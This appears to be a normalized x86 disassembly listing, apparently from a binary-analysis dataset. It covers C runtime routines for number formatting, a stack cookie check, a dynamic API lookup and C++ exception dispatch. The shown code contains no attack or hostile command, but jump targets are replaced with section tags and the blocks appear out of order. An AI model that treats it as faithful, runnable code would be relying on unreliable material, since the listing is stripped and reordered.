mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_413910
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_413910
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_41202e
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_40b00b
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_40d694
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40f5bf
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_411a2b
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_411a2b
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_411a2b
push edi
push 0x30
push esi
call sub_40e940
add esp 0xc
sub_412123
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_413881
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_40d694
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40f5bf
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40fd18
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_41202e
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_413709
add esp 0x10
cmp eax ebx
je r-xdata
sub_4121dc
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_413881
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_40d694
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_40f5bf
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
cmp ecx 0xffffffff
lea edi [ eax + esi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40fd18
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_413709
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_411a64
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_41202e
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_4122d4
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411bd1
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412123
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411cbd
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4121dc
jmp r-xdata
sub_41235a
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4122d4
add esp 0x1c
pop ebp
retn
sub_41237b
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_413a0f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_40f4c3
add esp 0x14
sub_4123a4
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_4123e0
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_4123a4
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_412436
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_40d810
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
je r-xdata
sub_412492
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_40bf4b
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
retn
call sub_40bf4b
add eax 0x90
dec [ eax ]
call sub_40bf4b
and [ eax + 0x90 ] 0x0
jmp sub_40d898
sub_4124d6
push 0x10
push r--data
call sub_40c69c
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41259c
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_40bf4b
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_40c6e1
retn
call sub_40d8e4
call sub_40d8e4
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_4130a0
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_4125b7
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_40bf4b
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_4125fc
push 0x8
push r--data
call sub_40c69c
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_40c6e1
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_4113a8
mov [ ebp - 0x4 ] 0xfffffffe
sub_412650
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
push esi
mov esi [ esp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_412675
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_40d8e4
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
test ebx ebx
lea esi [ eax + 0x4 ]
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_412436
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_412737
push 0x2c
push r--data
call sub_40c69c
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_41164c
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_40bf4b
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_40bf4b
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_40bf4b
mov [ eax + 0x88 ] esi
call sub_40bf4b
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_4116e1
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41285d
mov eax [ ebp - 0x1c ]
call sub_40c6e1
retn
sub_4127d0
mov esp [ ebp - 0x18 ]
call sub_40bf4b
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_4124d6
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41285d
mov eax [ ebp - 0x1c ]
call sub_40c6e1
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_41285d
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_411695
pop ecx
call sub_40bf4b
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_40bf4b
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_411674
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_4125fc
pop ecx
pop ecx
sub_4128d3
push 0xc
push r--data
call sub_40c69c
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_413aaf
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_413aaf
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40d8e4
push ebx
push esi
call sub_413aaf
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_413aaf
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_413aaf
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_413aaf
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_413aaf
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_413aaf
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_40ab70
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_413aaf
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_412650
pop ecx
pop ecx
push eax
push esi
call sub_40ab70
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_40c6e1
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_412650
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_412a52
push 0x8
push r--data
call sub_40c69c
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_412650
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_4113a8
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_4128d3
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c6e1
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_412650
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_4113a8
jmp r-xdata
sub_412ae3
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_412a52
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_411378
call sub_4113af
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_4124d6
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_412737
add esp 0x28
test eax eax
je r-xdata
sub_412b4f
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_40bf4b
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_40bf4b
lea edi [ eax + 0x80 ]
call sub_40bd26
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_4115d9
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_40d8e4
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_411467
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_412ae3
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_412c41
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_40d8e4
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_40bf4b
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40d8e4
jmp sub_40d898
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_412b4f
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_40bf4b
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_40bf4b
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_40bf4b
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_413aaf
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_4115d9
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_40d8e4
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_4125fc
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_40bf4b
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_40bf4b
mov edi [ eax + 0x94 ]
call sub_40bf4b
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_412675
test al al
pop ecx
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
test eax eax
mov [ ebp - 0x18 ] eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_412675
test al al
pop ecx
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x14 ] eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_40b55f
test al al
jne r-xdata
call sub_40d8e4
cmp eax 0x19930522
jne r-xdata
call sub_40bf4b
call sub_40bf4b
call sub_40bf4b
mov [ eax + 0x88 ] esi
call sub_40bf4b
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_412436
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_4125fc
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] r--data
call sub_40b5aa
push r--data
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x2c ] r--data
call sub_41175f
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_412ae3
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_4113af
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4124d6
add esp 0x10
push [ esi + 0x1c ]
call sub_4126ee
sub_412faf
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_40bf4b
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
